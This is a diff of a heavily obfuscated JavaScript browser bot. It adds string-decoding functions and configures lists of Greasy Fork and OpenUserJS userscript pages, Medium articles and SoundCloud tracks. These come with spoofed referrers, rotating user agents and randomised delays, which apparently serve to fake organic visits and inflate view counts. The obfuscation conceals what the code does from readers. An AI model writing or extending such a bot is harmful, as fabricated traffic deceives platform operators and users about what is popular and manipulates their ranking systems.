@@ -1,40 +1,132 @@
+function d(b, c) {
+  const e = a();
+  return d = function(f, g) {
+    f = f - (-0x1465 * -0x1 + 0x166 + 0x7 * -0x31d);
+    let h = e[f];
+    return h;
+  }, d(b, c);
+}
+
+function a() {
+  const bn = [
+    'WRf5WQdcVmoMWPpdQGhcRbG',
+    'W5GLWPy',
+    'y29UC3rYDwn0BW',
+    'W5BdOmoIfSoKCSkjwSo+nG',
+    'map',
+    'mmkhiSozALuFC8o2Da',
+    'emoFnq',
+    'zK1XuNvFt04Tra',
+    'W41iW752rCk3fmkiWR7cSG',
+    'bsZdU8oGdCkZW5BcKmk1yG',
+    'pts/by-sit',
+    'iCkttCkwlqpdMXuIAW',
+    'krFcOCo2W4VcNq',
+    'Ahr0Chm6lY9NCG',
+    '68ea2711d1',
+    '-pancake-m',
+    'pYpcGCk2W4m/kfnOWOi',
+    'W5ldQSoPW6hcG8oXWPddMSkmW7u',
+    'fs9EW6hdImoSqeqeqq',
+    'EmowpJXndSopWQyHwq',
+    'sCkjjmknnvympSo1',
+    'ACovcq',
+    'rxbqmNLTrf9rrW',
+    'yvHUb3mevCkpWO/dJa',
+    'qgSSsfzFcSkpW4tdOq',
+    'https://gr',
+    '\x20Chrome/10',
+    'CuvqvhLKz3DOna',
+    'mMG0zZDLDxfslq',
+    'qsPaWPFdOhVdStVcRmob'
+  ];
+  a = function() {
+    return bn;
+  };
+  return a();
+}
+
+function b(c, d) {
+  const e = a();
+  return b = function(f, g) {
+    f = f - (-0x1465 * -0x1 + 0x166 + 0x7 * -0x31d);
+    let h = e[f];
+    if (b['umQJHB'] === undefined) {
+      var i = function(n) {
+        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
+        let p = '',
+          q = '';
+        for (let r = -0x1a48 + -0x68 * -0x1f + 0xdb0, s, t, u = 0x822 + 0xf7 * 0x27 + -0x2dc3; t = n['charAt'](u++); ~t && (s = r % (0x1 * -0x1ef6 + 0x1102 * -0x1 + 0x2ffc) ? s * (0x1082 + 0x3 * -0x3df + -0x4a5) + t : t, r++ % (-0x1eac + 0x536 * -0x4 + 0x1 * 0x3388)) ? p += String['fromCharCode'](-0x1f23 + 0x2 * 0xc26 + 0x7d6 & s >> (-(0xfd9 * -0x1 + -0x3e * -0x5b + 0x1 * -0x62f) * r & 0x60f * -0x1 + -0x43b + 0x294 * 0x4)) : -0x209f * -0x1 + -0x1 * -0xf7 + 0x1 * -0x2196) {
+          t = o['indexOf'](t);
+        }
+        for (let v = -0x4 * -0x8e2 + 0x2396 * -0x1 + 0xe, w = p['length']; v < w; v++) {
+          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x23db * 0x1 + 0x4 * -0x6de + -0x853))['slice'](-(0x26 * -0x6 + 0x1a19 + -0x1933 * 0x1));
+        }
+        return decodeURIComponent(q);
+      };
+      const m = function(n, o) {
+        let p = [],
+          q = 0x1052 + 0x92d + -0x3d * 0x6b,
+          r, t = '';
+        n = i(n);
+        let u;
+        for (u = -0xcd7 + -0xc1 * 0x1c + 0x21f3; u < 0x14b * -0x1e + -0x1b99 * -0x1 + -0x1 * -0xc31; u++) {
+          p[u] = u;
+        }
+        for (u = -0x4 * 0x3b4 + 0x1b * -0x109 + 0x2ac3; u < -0x226c + -0x1720 + -0x1d46 * -0x2; u++) {
+          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x89 * 0x43 + -0x1977 + -0x2 * 0x4b2), r = p[u], p[u] = p[q], p[q] = r;
+        }
+        u = 0x1848 + -0x2551 + -0x2f * -0x47, q = -0x2 * -0x11ef + -0x347 * -0x9 + -0x415d;
+        for (let v = 0x1b97 + 0xc7a + -0x107 * 0x27; v < n['length']; v++) {
+          u = (u + (-0x8a5 * 0x2 + 0x1 * -0x1817 + 0x2962)) % (0x12a3 * 0x2 + 0x14ee + -0x3934), q = (q + p[u]) % (0x1 * -0x138f + 0x24a4 + -0x1015), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x1 * 0x1b54 + 0xca6 * -0x1 + 0x28fa)]);
+        }
+        return t;
+      };
+      b['nPRWCF'] = m, c = arguments, b['umQJHB'] = !![];
+    }
+    const j = e[0x2 * -0x15b + 0x1 * 0x1bd3 + -0x191d],
+      k = f + j,
+      l = c[k];
+    return !l ? (b['sVQhQE'] === undefined && (b['sVQhQE'] = !![]), h = b['nPRWCF'](h, g), c[k] = h) : h = l, h;
+  }, b(c, d);
+}
+
+function c(b, d) {
+  const e = a();
+  return c = function(f, g) {
+    f = f - (-0x1465 * -0x1 + 0x166 + 0x7 * -0x31d);
+    let h = e[f];
+    if (c['YapsAf'] === undefined) {
+      var i = function(m) {
+        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
+        let o = '',
+          p = '';
+        for (let q = -0x1a48 + -0x68 * -0x1f + 0xdb0, r, s, t = 0x822 + 0xf7 * 0x27 + -0x2dc3; s = m['charAt'](t++); ~s && (r = q % (0x1 * -0x1ef6 + 0x1102 * -0x1 + 0x2ffc) ? r * (0x1082 + 0x3 * -0x3df + -0x4a5) + s : s, q++ % (-0x1eac + 0x536 * -0x4 + 0x1 * 0x3388)) ? o += String['fromCharCode'](-0x1f23 + 0x2 * 0xc26 + 0x7d6 & r >> (-(0xfd9 * -0x1 + -0x3e * -0x5b + 0x1 * -0x62f) * q & 0x60f * -0x1 + -0x43b + 0x294 * 0x4)) : -0x209f * -0x1 + -0x1 * -0xf7 + 0x1 * -0x2196) {
+          s = n['indexOf'](s);
+        }
+        for (let u = -0x4 * -0x8e2 + 0x2396 * -0x1 + 0xe, v = o['length']; u < v; u++) {
+          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x23db * 0x1 + 0x4 * -0x6de + -0x853))['slice'](-(0x26 * -0x6 + 0x1a19 + -0x1933 * 0x1));
+        }
+        return decodeURIComponent(p);
+      };
+      c['vycHec'] = i, b = arguments, c['YapsAf'] = !![];
+    }
+    const j = e[0x1052 + 0x92d + -0x3d * 0x6b],
+      k = f + j,
+      l = b[k];
+    return !l ? (h = c['vycHec'](h), b[k] = h) : h = l, h;
+  }, c(b, d);
+}
 const a5 = c,
   a4 = b,
   a3 = d;
 
 function getRandomInt(f, g) {
   const h = ceil(f);
-  return floor(random() * (floor(g) - h + (0xd5f + 0x9 * -0x24e + 0x4 * 0x1d8))) + h;
+  return floor(random() * (floor(g) - h + (-0x1f82 + 0x1 * -0x1ef6 + 0x3e79 * 0x1))) + h;
 }
 async function randomWait() {
-  return await wait(0x1d51 * 0x1 + -0x24d * 0xe + -0x166d * -0x1 + (-0x2609 + -0x2db + 0x3c6c) * random()), 0x2395 * 0x1 + 0x1f9 * -0xa + -0xfda;
-}
-
-function c(b, d) {
-  const e = a();
-  return c = function(f, g) {
-    f = f - (0x1 * -0x1cc7 + 0x74f * 0x5 + -0x1f1 * 0x4);
-    let h = e[f];
-    if (c['RyjUxX'] === undefined) {
-      var i = function(m) {
-        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
-        let o = '',
-          p = '';
-        for (let q = 0x1 * 0x637 + -0x1194 + -0xb5d * -0x1, r, s, t = 0x9 * 0xbf + -0x145d + 0xda6; s = m['charAt'](t++); ~s && (r = q % (0x1 * 0x15a + -0x8f9 * -0x1 + 0xa4f * -0x1) ? r * (-0x298 * -0x2 + -0x1ed4 + 0x19e4) + s : s, q++ % (-0x1dd6 + -0x18d * 0x12 + 0x39c4 * 0x1)) ? o += String['fromCharCode'](0x639 + 0xd37 * 0x2 + 0x1fa8 * -0x1 & r >> (-(-0x26b8 + 0xfdb + -0x1 * -0x16df) * q & -0xa9 * -0x31 + 0x5 * -0x48d + -0x32 * 0x31)) : -0x27 * 0xe5 + 0x1410 + 0xed3) {
-          s = n['indexOf'](s);
-        }
-        for (let u = -0x3ed * -0x3 + -0x8f5 * 0x3 + 0xc * 0x142, v = o['length']; u < v; u++) {
-          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0xb7e * -0x3 + 0x1305 * -0x2 + 0x2 * 0x244a))['slice'](-(-0x2063 * -0x1 + 0x1197 + -0x31f8));
-        }
-        return decodeURIComponent(p);
-      };
-      c['aqZzag'] = i, b = arguments, c['RyjUxX'] = !![];
-    }
-    const j = e[0x4 * 0x3f5 + 0x24bc + 0x1a48 * -0x2],
-      k = f + j,
-      l = b[k];
-    return !l ? (h = c['aqZzag'](h), b[k] = h) : h = l, h;
-  }, c(b, d);
+  return await wait(-0xc11 + 0x1082 + 0x1 * 0xf17 + (-0x2004 + -0x1eac + 0x1b68 * 0x3) * random()), 0xad6 + -0x43 * -0x1 + 0x2 * -0x58c;
 }
 const flags = {
     'ActivateBrowser': 0x1,
@@ -60,9 +152,9 @@ const flags = {
     ceil: ceil,
     min: min
   } = Math,
-  NETWORK_PATIENCE = 0xf1b * 0x1 + 0x4ab2 + -0x1b * 0x197 + (-0x14c9 + -0x13 * -0x8 + -0x185 * -0x15) * random(),
-  MM_NETWORK_PATIENCE = (-0x313 * -0xb + 0xb6b + 0xf13 * -0x3) * NETWORK_PATIENCE,
-  me = random()['toString'](-0x1315 + -0xda * 0xd + -0x60b * -0x5)['substring'](0x1 * 0x15d + -0x1d44 + 0x1beb, 0x1993 * 0x1 + 0x1 * 0x1d29 + 0x2 * -0x1b59),
+  NETWORK_PATIENCE = 0x1 * -0x4c1a + 0x8 * -0x4c1 + 0xa102 + (0x980 + 0xe77 + 0xc3f * -0x1) * random(),
+  MM_NETWORK_PATIENCE = (0xa89 * -0x3 + 0x61 * 0x1d + 0x14a1) * NETWORK_PATIENCE,
+  me = random()['toString'](0x1 * 0x1ed + -0x7a6 * 0x1 + -0x1 * -0x5c9)['substring'](0x263e + -0x1b6 * -0x16 + 0x86e * -0x9, 0xb62 + 0x944 + 0x149c * -0x1),
   pptOptions = {
     'headless': 0x0,
     'setDefaultNavigationTimeout': 0x0,
@@ -108,7 +200,7 @@ const flags = {
       },
       {
         'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
-        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
+        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + a3(0xa) + 'e/zhihu.co' + 'm'
       },
       {
         'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
@@ -120,10 +212,10 @@ const flags = {
       },
       {
         'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
-        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
+        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + a4(0x1d, '!A6j') + 'com?page=9'
       },
       {
-        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + a3(0x1),
+        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
         'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
       },
       {
@@ -132,7 +224,7 @@ const flags = {
       },
       {
         'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
-        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
+        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + a4(0x3, 'Y#EM')
       },
       {
         'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
@@ -140,11 +232,11 @@ const flags = {
       },
       {
         'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
-        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
+        'preRef': a3(0x19) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
       },
       {
         'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
-        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + a3(0x6) + 'com?page=9'
+        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
       },
       {
         'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
@@ -152,7 +244,7 @@ const flags = {
       },
       {
         'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
-        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
+        'preRef': a5(0xd) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
       },
       {
         'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
@@ -171,7 +263,7 @@ const flags = {
         'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
       },
       {
-        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
+        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + a4(0x8, '8hu5') + 'ity',
         'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
       },
       {
@@ -211,7 +303,7 @@ const flags = {
         'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
       },
       {
-        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
+        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + a3(0xf) + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
         'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
       },
       {
@@ -235,7 +327,7 @@ const flags = {
         'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
       },
       {
-        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
+        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + a4(0xb, 'oJ#n') + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
         'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
       },
       {
@@ -243,7 +335,7 @@ const flags = {
         'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
       },
       {
-        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + a4(0xe, '0apD') + 'down',
+        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
         'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
       },
       {
@@ -255,7 +347,7 @@ const flags = {
         'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
       },
       {
-        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
+        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + a4(0x11, '^6Pm') + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
         'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
       },
       {
@@ -264,7 +356,7 @@ const flags = {
       },
       {
         'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
-        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
+        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + a4(0x15, 'oJ#n')
       },
       {
         'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
@@ -275,12 +367,12 @@ const flags = {
         'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
       },
       {
-        'url': 'https://gr' + 'easyfork.o' + a5(0x0) + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
+        'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
         'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
       },
       {
         'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
-        'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
+        'preRef': a3(0x19) + a4(0x18, 'W0Ro') + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
       },
       {
         'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
@@ -298,8 +390,8 @@ const flags = {
     'userAgents': [
       'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
       'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
-      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
-      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + a5(0xd) + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
+      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + a3(0x1a) + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
+      'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
       'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
       'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
       'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
@@ -322,19 +414,19 @@ const flags = {
       'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
       'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
       'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
-      'https://me' + a3(0x10) + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
+      'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
       'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
       'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
       'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
       'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
       'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
       'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
-      'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
+      'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + a4(0x14, '9RtC'),
       'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
       'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
       'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
       'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
-      a4(0x5, 'nVFJ') + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
+      'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
       'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
     ],
     'soundcloudTracks': [
@@ -342,34 +434,34 @@ const flags = {
       'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/house-s' + 'ettling-ft' + '-danny-bro' + 'wn?si=3527' + 'c3f6b1904b' + 'edac2d3673' + 'b266b9aa&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing',
       'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=2ec72b' + 'b6d77b4a08' + 'b2e8422f68' + '55699b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g',
       'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=357e' + '7dfc02cc4e' + 'a28b94c66a' + 'f7050293&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing',
-      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/sisyphu' + 's?si=2646e' + 'cb7ea704ba' + '68ea2711d1' + '659e92a&ut' + 'm_source=c' + 'lipboard&u' + 'tm_medium=' + 'text&utm_c' + 'ampaign=so' + 'cial_shari' + 'ng',
-      'https://so' + a3(0x8) + 'om/quadeca' + 'x8/knots?s' + 'i=c127f344' + 'b3d34c9ca8' + 'e3d7cb4679' + '18f7&utm_s' + 'ource=clip' + 'board&utm_' + 'medium=tex' + 't&utm_camp' + 'aign=socia' + 'l_sharing',
+      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/sisyphu' + 's?si=2646e' + 'cb7ea704ba' + a3(0xe) + '659e92a&ut' + 'm_source=c' + 'lipboard&u' + 'tm_medium=' + 'text&utm_c' + 'ampaign=so' + 'cial_shari' + 'ng',
+      'https://so' + 'undcloud.c' + 'om/quadeca' + 'x8/knots?s' + 'i=c127f344' + 'b3d34c9ca8' + 'e3d7cb4679' + '18f7&utm_s' + 'ource=clip' + 'board&utm_' + 'medium=tex' + 't&utm_camp' + 'aign=socia' + 'l_sharing',
       'https://so' + 'undcloud.c' + 'om/sadfros' + 'ty/beavis-' + 'butthead?s' + 'i=289d5c98' + 'ab0142b982' + '8ef6d51245' + 'b690&utm_s' + 'ource=clip' + 'board&utm_' + 'medium=tex' + 't&utm_camp' + 'aign=socia' + 'l_sharing',
       'https://so' + 'undcloud.c' + 'om/tyler-w' + 'allace-62/' + 'legacy-emi' + 'nem-remix-' + '1?si=8789c' + '4ffc202403' + 'bb58d7a49a' + '59ee589&ut' + 'm_source=c' + 'lipboard&u' + 'tm_medium=' + 'text&utm_c' + 'ampaign=so' + 'cial_shari' + 'ng'
     ],
     'oujsToAssist': [
       'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
       'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
-      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + a3(0x9) + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
+      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
       'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
       'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
       'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
       'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
       'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
       'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
-      'https://op' + 'enuserjs.o' + 'rg/scripts' + a5(0xa) + 'witter_Ima' + 'ge_Maximiz' + 'er',
